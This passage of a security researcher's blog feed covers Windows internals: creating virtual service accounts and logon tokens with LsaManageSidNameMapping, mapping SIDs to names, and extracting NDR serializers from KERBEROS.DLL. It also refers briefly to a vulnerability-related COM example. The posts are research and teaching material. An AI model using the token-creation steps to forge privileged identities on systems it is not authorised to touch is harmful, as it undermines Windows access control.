dwCount, MULTI_QI pResults[]);</span></div><p>It seems that the answer is yes. Of course it's possible that you still can't mix the two things up. That's why I wrote a quick and dirty example in C#, which is available <a href=\"https://gist.github.com/tyranid/c4a77598169e1a75b70c5a2c023bc5df\">here</a>. Seems to work fine. Of course I've not tested it out with the actual vulnerability to see it works in that scenario. That's something for others to do.</p>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3047462974857219151"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3047462974857219151"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2021/04/standard-activating-yourself-to.html", "title": "Standard Activating Yourself to Greatness"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-4309724029244746740", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/10/creating-your-own-virtual-service.html", "published": "2020-10-26T16:54:00.002-07:00", "published_parsed": [2020, 10, 26, 23, 54, 0, 0, 300, 0], "updated": "2020-10-26T16:54:38.132-07:00", "updated_parsed": [2020, 10, 26, 23, 54, 38, 0, 300, 0], "title": "Creating your own Virtual Service Accounts", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Creating your own Virtual Service Accounts"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>Following on from the <a href=\"https://www.tiraniddo.dev/2020/10/using-lsamanagesidnamemapping-to-add.html\">previous blog post</a>, if you can't map arbitrary SIDs to names to make displaying capabilities nicer what is the purpose of&nbsp;<i>LsaManageSidNameMapping</i>? The primary purpose is to facilitate the creation of <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/service-accounts#bkmk-virtualserviceaccounts\">Virtual Service Accounts</a>.&nbsp;</p><p>A virtual service account allows you to create an access token where the user SID is a service SID, for example, <b style=\"font-style: italic;\">NT SERVICE\\TrustedInstaller</b>. A virtual service account doesn't need to have a password configured which makes them ideal for restricting services rather than having to deal with the default service accounts and using WSH to lock them down or specifying a domain user with password.</p><p>To create an access token for a virtual service account you can use <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/logonuserexexw\">LogonUserExEx</a> and specify the undocumented (AFAIK)&nbsp;<i>LOGON32_PROVIDER_VIRTUAL</i> logon provider. You must have <i>SeTcbPrivilege </i>to create the token, and the SID of the account must have its first RID in the range 80 to 111 inclusive. Recall from the previous blog post this is exactly the same range that is covered by&nbsp;<i>LsaManageSidNameMapping</i>.</p><p>The <i>LogonUserExEx </i>API only takes strings for the domain and username, you can't specify a SID. Using the&nbsp;<i>LsaManageSidNameMapping</i>&nbsp;function allows you to map a username and domain to a virtual service account SID. LSASS prevents you from using RID 80 <i>(NT SERVICE)</i>&nbsp;and 87 <i>(NT TASK)</i>&nbsp;outside of the SCM or the task scheduler service (see <a href=\"https://gist.github.com/tyranid/6693b94462dd62b917b063e30717534e\">this snippet</a> of reversed LSASS code for how it checks). However everything else in the RID range is fair game.</p><p>So let's create out own virtual service account. First you need to add your domain and username using the tool from the previous blog post. All these commands need to be run as a user with <i>SeTcbPrivilege</i>.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">SetSidMapping.exe S-1-5-100=\"AWESOME DOMAIN\"&nbsp;<br />SetSidMapping.exe S-1-5-100-1=\"AWESOME DOMAIN\\USER\"</span></div><p>So we now have the <i>AWESOME DOMAIN\\USER</i> account with the SID <i>S-1-5-100-1</i>. Now before we can login the account you need to grant it a logon right. This is normally&nbsp;<i>SeServiceLogonRight </i>if you wanted a service account, but you can specify any logon right you like, even <i>SeInteractiveLogonRight </i>(sadly I don't believe you can actually login with your virtual account, at least easily).</p><p>If you get the latest version of <i>NtObjectManager </i>(from <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools\">github</a> at the time of writing) you can use the <i>Add-NtAccountRight</i> command to add the logon type.</p><p><span style=\"font-family: courier;\">PS&gt; Add-NtAccountRight -Sid 'S-1-5-100-1' -LogonType SeInteractiveLogonRight</span></p><p>Once granted a logon right you can use the&nbsp;<i>Get-NtToken</i>&nbsp;command to logon the account and return a token.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; $token = Get-NtToken -Logon -LogonType Interactive -User USER&nbsp;</span><span style=\"font-family: courier;\">-Domain 'AWESOME DOMAIN' -LogonProvider Virtual</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; Format-NtToken $token<br />AWESOME DOMAIN\\USER</span></div><p>As you can see we've authenticated the virtual account and got back a token. As we chose to logon as an interactive type the token will also have the <i>INTERACTIVE </i>group assigned. Anyway that's all for now. I guess as there's only a limited number of RIDs available (which is an artificial restriction) MS don't want document these features even though it could be a useful thing for normal developers.</p><p><br /></p><p><br /></p>"}], "summary": "<p>Following on from the <a href=\"https://www.tiraniddo.dev/2020/10/using-lsamanagesidnamemapping-to-add.html\">previous blog post</a>, if you can't map arbitrary SIDs to names to make displaying capabilities nicer what is the purpose of&nbsp;<i>LsaManageSidNameMapping</i>? The primary purpose is to facilitate the creation of <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/service-accounts#bkmk-virtualserviceaccounts\">Virtual Service Accounts</a>.&nbsp;</p><p>A virtual service account allows you to create an access token where the user SID is a service SID, for example, <b style=\"font-style: italic;\">NT SERVICE\\TrustedInstaller</b>. A virtual service account doesn't need to have a password configured which makes them ideal for restricting services rather than having to deal with the default service accounts and using WSH to lock them down or specifying a domain user with password.</p><p>To create an access token for a virtual service account you can use <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/logonuserexexw\">LogonUserExEx</a> and specify the undocumented (AFAIK)&nbsp;<i>LOGON32_PROVIDER_VIRTUAL</i> logon provider. You must have <i>SeTcbPrivilege </i>to create the token, and the SID of the account must have its first RID in the range 80 to 111 inclusive. Recall from the previous blog post this is exactly the same range that is covered by&nbsp;<i>LsaManageSidNameMapping</i>.</p><p>The <i>LogonUserExEx </i>API only takes strings for the domain and username, you can't specify a SID. Using the&nbsp;<i>LsaManageSidNameMapping</i>&nbsp;function allows you to map a username and domain to a virtual service account SID. LSASS prevents you from using RID 80 <i>(NT SERVICE)</i>&nbsp;and 87 <i>(NT TASK)</i>&nbsp;outside of the SCM or the task scheduler service (see <a href=\"https://gist.github.com/tyranid/6693b94462dd62b917b063e30717534e\">this snippet</a> of reversed LSASS code for how it checks). However everything else in the RID range is fair game.</p><p>So let's create out own virtual service account. First you need to add your domain and username using the tool from the previous blog post. All these commands need to be run as a user with <i>SeTcbPrivilege</i>.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">SetSidMapping.exe S-1-5-100=\"AWESOME DOMAIN\"&nbsp;<br />SetSidMapping.exe S-1-5-100-1=\"AWESOME DOMAIN\\USER\"</span></div><p>So we now have the <i>AWESOME DOMAIN\\USER</i> account with the SID <i>S-1-5-100-1</i>. Now before we can login the account you need to grant it a logon right. This is normally&nbsp;<i>SeServiceLogonRight </i>if you wanted a service account, but you can specify any logon right you like, even <i>SeInteractiveLogonRight </i>(sadly I don't believe you can actually login with your virtual account, at least easily).</p><p>If you get the latest version of <i>NtObjectManager </i>(from <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools\">github</a> at the time of writing) you can use the <i>Add-NtAccountRight</i> command to add the logon type.</p><p><span style=\"font-family: courier;\">PS&gt; Add-NtAccountRight -Sid 'S-1-5-100-1' -LogonType SeInteractiveLogonRight</span></p><p>Once granted a logon right you can use the&nbsp;<i>Get-NtToken</i>&nbsp;command to logon the account and return a token.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; $token = Get-NtToken -Logon -LogonType Interactive -User USER&nbsp;</span><span style=\"font-family: courier;\">-Domain 'AWESOME DOMAIN' -LogonProvider Virtual</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; Format-NtToken $token<br />AWESOME DOMAIN\\USER</span></div><p>As you can see we've authenticated the virtual account and got back a token. As we chose to logon as an interactive type the token will also have the <i>INTERACTIVE </i>group assigned. Anyway that's all for now. I guess as there's only a limited number of RIDs available (which is an artificial restriction) MS don't want document these features even though it could be a useful thing for normal developers.</p><p><br /></p><p><br /></p>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/4309724029244746740"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/4309724029244746740"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/10/creating-your-own-virtual-service.html", "title": "Creating your own Virtual Service Accounts "}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-8738889221673519203", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/10/using-lsamanagesidnamemapping-to-add.html", "published": "2020-10-24T16:23:00.000-07:00", "published_parsed": [2020, 10, 24, 23, 23, 0, 5, 298, 0], "updated": "2020-10-24T16:23:29.769-07:00", "updated_parsed": [2020, 10, 24, 23, 23, 29, 5, 298, 0], "title": "Using LsaManageSidNameMapping to add a name to a SID.", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Using LsaManageSidNameMapping to add a name to a SID."}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>I was digging into exactly how service SIDs are mapped back to a name when I came across the API&nbsp;<i>LsaLookupManageSidNameMapping</i>. Unsurprisingly this API is not officially documented either on MSDN or in the Windows SDK. However,&nbsp;<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/jj902653(v=vs.85)\">LsaManageSidNameMapping</a> is documented (mostly). Turns out that after a little digging they lead to the same RPC function in LSASS, just through different names:</p><p><i>LsaLookupManageSidNameMapping</i> -&gt; <i>lsass!LsaLookuprManageCache</i></p><p>and</p><p><i>LsaManageSidNameMapping</i> -&gt; <i>lsasrv!LsarManageSidNameMapping</i></p><p>They ultimately both end up in&nbsp;<i>lsasrv!LsarManageSidNameMapping</i>. I've no idea why there's two of them and why one is documented but the other not. <b>*shrug*</b>. Of course even though there's an MSDN entry for the function it doesn't seem to actually be documented in the <i>Ntsecapi.h</i> include file <b>*double shrug*</b>. Best documentation I found was this <a href=\"https://github.com/jingoro2112/dna/blob/master/dnausb/win32/ddk/api/lsalookupi.h\">header file</a>.</p><p>This got me wondering if I could map all the AppContainer named capabilities via LSASS so that normal applications would resolve them rather than having to do it myself. This would be easier than modifying the SAM or similar tricks. Sadly while you can add some SID to name mappings this API won't let you do that for capability SIDs as there are the following calling restrictions:</p><p></p><ol style=\"text-align: left;\"><li>The caller needs <i>SeTcbPrivilege </i>(this is a given with an LSA API).</li><li>The SID to map must be in the NT security authority (5) and the domain's first RID must be between 80 and 111 inclusive.</li><li>You must register a domain SID's name first to use the SID which includes it.</li></ol><div>Basically 2 stops us adding a sub-domain SID for a capability as they use the package security authority (15) and we can't just go straight to added the SID to name as we need to have registered the domain with the API, it's not enough that the domain exists. Maybe there's some other easy way to do it, but this isn't it.</div><div><br /></div><div>Instead I've just put together a .NET tool to add or remove your own SID to name mappings. It's up on <a href=\"https://github.com/tyranid/setsidmapping\">github</a>. The mappings are ephemeral so if you break something rebooting <i>should</i> fix it :-)</div><div><br /></div><div><br /></div><p></p>"}], "summary": "<p>I was digging into exactly how service SIDs are mapped back to a name when I came across the API&nbsp;<i>LsaLookupManageSidNameMapping</i>. Unsurprisingly this API is not officially documented either on MSDN or in the Windows SDK. However,&nbsp;<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/jj902653(v=vs.85)\">LsaManageSidNameMapping</a> is documented (mostly). Turns out that after a little digging they lead to the same RPC function in LSASS, just through different names:</p><p><i>LsaLookupManageSidNameMapping</i> -&gt; <i>lsass!LsaLookuprManageCache</i></p><p>and</p><p><i>LsaManageSidNameMapping</i> -&gt; <i>lsasrv!LsarManageSidNameMapping</i></p><p>They ultimately both end up in&nbsp;<i>lsasrv!LsarManageSidNameMapping</i>. I've no idea why there's two of them and why one is documented but the other not. <b>*shrug*</b>. Of course even though there's an MSDN entry for the function it doesn't seem to actually be documented in the <i>Ntsecapi.h</i> include file <b>*double shrug*</b>. Best documentation I found was this <a href=\"https://github.com/jingoro2112/dna/blob/master/dnausb/win32/ddk/api/lsalookupi.h\">header file</a>.</p><p>This got me wondering if I could map all the AppContainer named capabilities via LSASS so that normal applications would resolve them rather than having to do it myself. This would be easier than modifying the SAM or similar tricks. Sadly while you can add some SID to name mappings this API won't let you do that for capability SIDs as there are the following calling restrictions:</p><p></p><ol style=\"text-align: left;\"><li>The caller needs <i>SeTcbPrivilege </i>(this is a given with an LSA API).</li><li>The SID to map must be in the NT security authority (5) and the domain's first RID must be between 80 and 111 inclusive.</li><li>You must register a domain SID's name first to use the SID which includes it.</li></ol><div>Basically 2 stops us adding a sub-domain SID for a capability as they use the package security authority (15) and we can't just go straight to added the SID to name as we need to have registered the domain with the API, it's not enough that the domain exists. Maybe there's some other easy way to do it, but this isn't it.</div><div><br /></div><div>Instead I've just put together a .NET tool to add or remove your own SID to name mappings. It's up on <a href=\"https://github.com/tyranid/setsidmapping\">github</a>. The mappings are ephemeral so if you break something rebooting <i>should</i> fix it :-)</div><div><br /></div><div><br /></div><p></p>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/8738889221673519203"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/8738889221673519203"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/10/using-lsamanagesidnamemapping-to-add.html", "title": "Using LsaManageSidNameMapping to add a name to a SID."}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-6546800563660569708", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/07/generating-ndr-type-serializers-for-c.html", "published": "2020-07-01T14:32:00.000-07:00", "published_parsed": [2020, 7, 1, 21, 32, 0, 2, 183, 0], "updated": "2020-07-01T14:33:16.405-07:00", "updated_parsed": [2020, 7, 1, 21, 33, 16, 2, 183, 0], "tags": [{"term": ".NET", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "MSRPC", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Programming", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Generating NDR Type Serializers for C#", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Generating NDR Type Serializers for C#"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "As part of updating <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools\">NtApiDotNet</a>&nbsp;to v1.1.28 I added support for <i>Kerberos</i> authentication tokens. To support this I needed to write the parsing code for <i>Tickets</i>. The majority of the <i>Kerberos</i> protocol uses ASN.1 encoding, however some Microsoft specific parts such as the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962\">Privileged Attribute Certificate (PAC)</a> uses <i>Network Data Representation (NDR)</i>. This is due to these parts of the protocol being derived from the older <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f\">NetLogon</a> protocol which uses <i>MSRPC</i>, which in turn uses <i>NDR</i>.<br /><br />I needed to implement code to parse the <i>NDR</i> stream and return the structured information. As I already had a <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/Ndr/Marshal/NdrUnmarshalBuffer.cs\">class to handle NDR</a> I could manually write the C# parser but that'd take some time and it'd have to be carefully written to handle all use cases. It'd be much easier if I could just use my existing NDR byte code parser to extract the structure information from the KERBEROS DLL. I'd fortunately already written the feature, but it can be non-obvious how to use it. Therefore this blog post gives you an overview of how to extract NDR structure data from existing DLLs and create standalone C# type serializer.<br /><br />First up, how does KERBEROS parse the NDR structure? It could have manual implementations, but it turns out that one of the lesser known features of the MSRPC runtime on Windows is its ability to generate standalone structure and procedure serializers without needing to use an RPC channel. In the documentation this is referred to as <a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/serialization-services\">Serialization Services</a>.<br /><br />To implement a <a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/type-serialization\">Type Serializer</a> you need to do the following in a C/C++ project. First, add the types to serialize inside an IDL file. For example the following defines a simple type to serialize.<br /><br /><span>interface TypeEncoders</span><br /><span>{</span><br /><span>&nbsp; &nbsp; typedef struct _TEST_TYPE</span><br /><span>&nbsp; &nbsp; {</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; [unique, string] wchar_t* Name;</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; DWORD Value;</span><br /><span>&nbsp; &nbsp; } TEST_TYPE;</span><br /><div><span>}</span></div><div><br /></div><div>You then need to create a separate ACF file with the same name as the IDL file (i.e. if you have <i>TYPES.IDL</i> create a file <i>TYPES.ACF</i>) and add the encode and decode attributes.</div><div><br /></div><div><div><span>interface TypeEncoders</span></div><div><span>{</span></div><div><span>&nbsp; &nbsp; typedef [encode, decode] TEST_TYPE;</span></div><div><span>}</span></div></div><div><br /></div><div>Compiling the IDL file using MIDL you'll get the client source code (such as <i>TYPES_c.c</i>), and you should find a few functions, the most important being <i>TEST_TYPE_Encode</i> and <i>TEST_TYPE_Decode</i> which serialize (encode) and deserialize (decode) a type from a byte stream. How you use these functions is not really important. We're more interested in understanding how the NDR byte code is configured to perform the serialization so that we can parse it and generate our own serializers.&nbsp;</div><div><br /></div>If you look at the <i>Decode </i>function when compiled for a X64 target it should look like the following:<br /><br /><span>void</span><br /><span>TEST_TYPE_Decode(</span><br /><span>&nbsp; &nbsp; handle_t _MidlEsHandle,</span><br /><span>&nbsp; &nbsp; TEST_TYPE * _pType)</span><br /><span>{</span><br /><span>&nbsp; &nbsp; NdrMesTypeDecode3(</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_MidlEsHandle,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;( PMIDL_TYPE_PICKLING_INFO&nbsp; )&amp;__MIDL_TypePicklingInfo,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;TypeEncoders_ProxyInfo,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TypePicklingOffsetTable,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_pType);</span><br /><span>}</span><br /><br />The <i>NdrMesTypeDecode3</i> is an API implemented in the RPC runtime DLL. You might be shocked to hear this, but this function and its corresponding <i>NdrMesTypeEncode3</i> are not documented in MSDN. However, the SDK headers contain enough information to understand how it works.<br /><br />The API takes 6 parameters:<br /><ol><li>The serialization handle, used to maintain state such as the current stream position and can be used multiple times to encode or decode more that one structure in a stream.</li><li>The <i>MIDL_TYPE_PICKLING_INFO</i> structure. This structure provides some basic information such as the NDR engine flags.</li><li>The&nbsp;<i>MIDL_STUBLESS_PROXY_INFO</i> structure. This contains the format strings and transfer types for both DCE and NDR64 syntax encodings.</li><li>A list of type offset arrays, these contains the byte offset into the format string (from the Proxy Info structure) for all type serializers.</li><li>The index of the type offset in the 4th parameter.</li><li>A pointer to the structure to serialize or deserialize.</li></ol><br />Only parameters 2 through 5 are needed to parse the NDR byte code correctly. Note that the <i>NdrMesType*3</i> APIs are used for dual DCE and NDR64 serializers. If you compile as 32 bit it will instead use <i>NdrMesType*2</i> APIs which only support DCE. I'll mention what you need to parse the DCE only APIs later, but for now most things you'll want to extract are going to have a 64 bit build which will almost always use&nbsp;<i>NdrMesType*3</i>&nbsp;even though my tooling only parses the DCE NDR byte code.<br /><br />To parse the type serializers you need to load the DLL you want to extract from into memory using <i>LoadLibrary </i>(to ensure any relocations are processed) then use either the <i>Get-NdrComplexType</i> PS command or the <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/dd8ce3fd151de2cea1932d8f1f11fd4d2ed34512/NtApiDotNet/Ndr/NdrParser.cs#L815\">NdrParser::ReadPicklingComplexType</a> method and pass the addresses of the 4 parameters.<br /><br />Let's look at an example in KERBEROS.DLL. We'll pick the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/31405771-207a-4855-aba8-b785beaa9d6c\">PAC_DEVICE_INFO</a> structure as it's pretty complex and would require a lot of work to manually write a parser. If you disassemble the&nbsp;<i>PAC_DecodeDeviceInfo</i> function you'll see the call to <i>NdrMesTypeDecode3 </i>as follows (from the DLL in Windows 10 2004 SHA1:173767EDD6027F2E1C2BF5CFB97261D2C6A95969).<br /><br /><span>mov&nbsp; &nbsp; &nbsp;[rsp+28h], r14&nbsp; ; pObject</span><br /><span>mov&nbsp; &nbsp; &nbsp;dword ptr [rsp+20h], 5 ; nTypeIndex</span><br /><span>lea&nbsp; &nbsp; &nbsp;r9, off_1800F3138 ; ArrTypeOffset</span><br /><span>lea&nbsp; &nbsp; &nbsp;r8, stru_1800D5EA0 ; pProxyInfo</span><br /><span>lea&nbsp; &nbsp; &nbsp;rdx, stru_1800DEAF0 ; pPicklingInfo</span><br /><span>mov&nbsp; &nbsp; &nbsp;rcx, [rsp+68h]&nbsp; ; Handle</span><br /><span>call&nbsp; &nbsp; NdrMesTypeDecode3</span><br /><br />From this we can extract the following values:<br /><br /><i>MIDL_TYPE_PICKLING_INFO = 0x1800DEAF0</i><br /><i>MIDL_STUBLESS_PROXY_INFO = 0x1800D5EA0</i><br /><i>Type Offset Array = 0x1800F3138</i><br /><i>Type Offset Index = 5</i><br /><br />These addresses are using the default load address of the library which is unlikely to be the same as where the DLL is loaded in memory. <i>Get-NdrComplexType</i> supports specifying relative addresses from a base module, so subtract the base address of 0x180000000 before using them. The following script will extract the type information.<br /><br /><span>PS&gt; $lib = Import-Win32Module KERBEROS.DLL</span><br /><span>PS&gt; $types = Get-NdrComplexType -PicklingInfo 0xDEAF0 -StublessProxy 0xD5EA0 `</span><br /><span>&nbsp; &nbsp; &nbsp;-OffsetTable 0xF3138 -TypeIndex 5 -Module $lib</span><br /><br />As long as there was no error from this command the <i>$types</i> variable will now contain the parsed complex types, in this case there'll be more than one. Now you can format them to a C# source code file to use in your application using <i>Format-RpcComplexType</i>.<br /><br /><span>PS&gt; Format-RpcComplexType $types -Pointer</span><br /><br />This will generate a C# file which looks like <a href=\"https://gist.github.com/tyranid/e82fbc61aac9b91394df07cc897603bc\">this</a>. The code contains <a href=\"https://gist.github.com/tyranid/e82fbc61aac9b91394df07cc897603bc#file-pac_device_info-cs-L380\">Encoder</a><i> </i>and <a href=\"https://gist.github.com/tyranid/e82fbc61aac9b91394df07cc897603bc#file-pac_device_info-cs-L422\">Decoder</a><i> </i>classes with static methods for each structure. We also passed the <i>Pointer</i> parameter to <i>Format-RpcComplexType</i>. This is so that the structured are wrapped inside a Unique Pointers. This is the default when using the real RPC runtime, although except for <a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/structures-tfs#:~:text=A%20conformant%20structure%20contains%20only,is%20embedded%20in%20this%20structure.\">Conformant Structures</a> isn't strictly necessary. If you don't do this then the decode will typically fail, certainly in this case.<br /><br />You might notice a serious issue with the generated code, there are no proper structure names. This is unavoidable, the MIDL compiler doesn't keep any name information with the NDR byte code, only the structure information. However, the basic Visual Studio refactoring tool can make short work of renaming things if you know what the names are supposed to be. You could also manually rename everything in the parsed structure information before using <i>Format-RpcComplexType</i>.<br /><br />In this case there is an alternative to all that. We can use the fact that the official MS documentation contains a <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/1d4912dd-5115-4124-94b6-fa414add575f\">full IDL</a> for <i>PAC_DEVICE_INFO</i> and its related structures and build our own executable with the NDR byte code to extract. How does this help? If you reference the <i>PAC_DEVICE_INFO</i> structure as part of an RPC interface no only can you avoid having to work out the offsets as Get-RpcServer will automatically find the location you can also use an additional feature to extract the type information from your private symbols to fixup the type information.<br /><br />Create a C++ project and in an IDL file copy the <i>PAC_DEVICE_INFO </i>structures from the protocol documentation. Then add the following RPC server.<br /><br /><span>[</span><br /><span>&nbsp; &nbsp; uuid(4870536E-23FA-4CD5-9637-3F1A1699D3DC),</span><br /><span>&nbsp; &nbsp; version(1.0),</span><br /><span>]</span><br /><span>interface RpcServer</span><br /><span>{</span><br /><span>&nbsp; &nbsp; int Test([in] handle_t hBinding,&nbsp;</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[unique] PPAC_DEVICE_INFO device_info);</span><br /><span>}</span><br /><br />Add the generated server C code to the project and add the following code somewhere to provide a basic implementation:<br /><br /><span>#pragma comment(lib, \"rpcrt4.lib\")</span><br /><span><br /></span><span>extern \"C\" void* __RPC_USER MIDL_user_allocate(size_t size) {</span><br /><span>&nbsp; &nbsp; return new char[size];</span><br /><span>}</span><br /><span><br /></span><span>extern \"C\" void __RPC_USER MIDL_user_free(void* p) {</span><br /><span>&nbsp; &nbsp; delete[] p;</span><br /><span>}</span><br /><span><br /></span><span>int Test(</span><br /><span>&nbsp; &nbsp; handle_t hBinding,</span><br /><span>&nbsp; &nbsp; PPAC_DEVICE_INFO device_info) {</span><br /><span>&nbsp; &nbsp; printf(\"Test %p\\n\", device_info);</span><br /><span>&nbsp; &nbsp; return 0;</span><br /><span>}</span><br /><br />Now compile the executable as a 64-bit release build if you're using 64-bit PS. The release build ensures there's no weird debug stub in front of your function which could confuse the type information. The implementation of <i>Test </i>needs to be unique, otherwise the linker will fold a duplicate function and the type information will be lost, we just <i>printf </i>a unique string.<br /><br />Now parse the RPC server using <i>Get-RpcServer </i>and format the complex types.<br /><br /><span>PS&gt; $rpc = Get-RpcServer RpcServer.exe -ResolveStructureNames</span><br /><span>PS&gt; Format-RpcComplexType $rpc.ComplexTypes -Pointer</span><br /><br />If everything has worked you'll now find the <a href=\"https://gist.github.com/tyranid/db971d5484b676f6f394bf051450760b\">output</a> to be much more useful. Admittedly I also did a bit of further cleanup in my version in <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/Win32/Security/Authentication/Kerberos/Ndr/PacDeviceInfoParser.cs\">NtApiDotNet</a> as I didn't need the encoders and I added some helper functions.<br /><br />Before leaving this topic I should point out how to handle called to <i>NdrMesType*2</i> in case you need to extract data from a library which uses that API. The parameters are slightly different to <i>NdrMesType*3</i>.<br /><br /><span>void</span><br /><span>TEST_TYPE_Decode(</span><br /><span>&nbsp; &nbsp; handle_t _MidlEsHandle,</span><br /><span>&nbsp; &nbsp; TEST_TYPE * _pType)</span><br /><span>{</span><br /><span>&nbsp; &nbsp; NdrMesTypeDecode2(</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_MidlEsHandle,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;( PMIDL_TYPE_PICKLING_INFO&nbsp; )&amp;__MIDL_TypePicklingInfo,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;TypeEncoders_StubDesc,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;( PFORMAT_STRING&nbsp; )&amp;types__MIDL_TypeFormatString.Format[2],</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_pType);</span><br /><span>}</span><br /><ol><li>The serialization handle.</li><li>The&nbsp;<i>MIDL_TYPE_PICKLING_INFO</i>&nbsp;structure.</li><li>The <i>MIDL_STUB_DESC</i>&nbsp;structure. This only contains DCE NDR byte code.</li><li>A pointer into the format string for the start of the type.</li><li>A pointer to the structure to serialize or deserialize.</li></ol>Again we can discard the first and last parameters. You can then get the addresses of the middle three and pass them to <i>Get-NdrComplexType</i>.<br /><br /><span>PS&gt; Get-NdrComplexType -PicklingInfo 0x1234 `</span><br /><span>&nbsp; &nbsp; -StubDesc 0x2345 -TypeFormat 0x3456 -Module $lib</span><br /><br />You'll notice that there's a offset in the format string (2 in this case) which you can pass instead of the address in memory. It depends what information your disassembler shows:<br /><br /><span>PS&gt; Get-NdrComplexType -PicklingInfo 0x1234 `</span><br /><span>&nbsp; &nbsp; -StubDesc 0x2345 -TypeOffset 2 -Module $lib</span><br /><br />Hopefully this is useful for implementing these NDR serializers in C#. As they don't rely on any native code (or the RPC runtime) you should be able to use them on other platforms in .NET Core even if you can't use the ALPC RPC code."}], "summary": "As part of updating <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools\">NtApiDotNet</a>&nbsp;to v1.1.28 I 